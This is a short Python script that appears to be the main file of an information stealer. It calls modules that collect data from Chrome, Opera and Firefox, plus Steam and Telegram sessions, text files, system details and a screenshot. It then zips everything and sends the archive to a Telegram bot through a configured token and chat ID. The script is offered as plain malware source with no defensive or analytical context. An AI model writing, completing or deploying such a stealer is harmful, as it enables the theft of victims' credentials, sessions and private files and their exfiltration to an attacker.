import settings

from modules.others import folder
from modules.system import sys
from modules.system import screen
from modules.browsers import chrome
from modules.browsers import opera
from modules.browsers import firefox
from modules.others import telegram
from modules.others import sender
from modules.others import makeitclean
from modules.others import steam
from modules.system import txt

TOKEN = settings.token
CHAT_ID = settings.chat_id


folder.makeFolders()
chrome.Chrome()
opera.Opera()
firefox.Firefox()
steam.Steam()
sys.SystemInfo()
txt.TxtSteal()
telegram.Telegram()
screen.Screenshot()

try:
    makeitclean.makemeZip()
except Exception as e:
    print(e)
try:
    sender.Send(TOKEN, CHAT_ID)
except Exception as e:
    print(e)
else:
    None